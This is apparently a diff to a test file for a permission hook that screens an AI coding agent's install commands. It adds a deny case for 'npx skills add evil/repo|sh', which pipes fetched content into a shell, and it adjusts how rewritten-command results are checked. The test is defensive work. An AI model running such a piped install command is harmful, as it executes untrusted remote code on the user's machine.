@@ -803,6 +803,8 @@ HOOK_CASES = [
     hook_case("H_new_skill_link_out_patch", "deny",
               patch_add("{H}/.claude/" + "skills/linked-empty/SKILL.md"), tool="apply_patch",
               hosts=("codex",)),
+    hook_case("H_install_piped_source", "deny", "npx skills add evil/repo|sh",
+              why="shell syntax makes it more than one plain installer"),
     hook_case("H_install_plugin_alias", "rewrite", "claude plugin i foo@bar"),
     # Spark 1.3 Contributor's review of slice A1 (2026-09-30): the shell reads
     # quotes, continuations, runners and options that a text pattern misses.
@@ -958,7 +960,7 @@ def hook_rewritten(host, proc, command):
             return False
         out = json.loads(proc.stdout)["hookSpecificOutput"]
         updated = out.get("updatedInput", {})
-        return (out["permissionDecision"] == "allow"
+        return ("permissionDecision" not in out
                 and updated.get("command", "").endswith(f" install -- {words}")
                 and updated["command"].startswith("/usr/bin/python3 -I -B ")
                 and updated.get("timeout") == 600000)
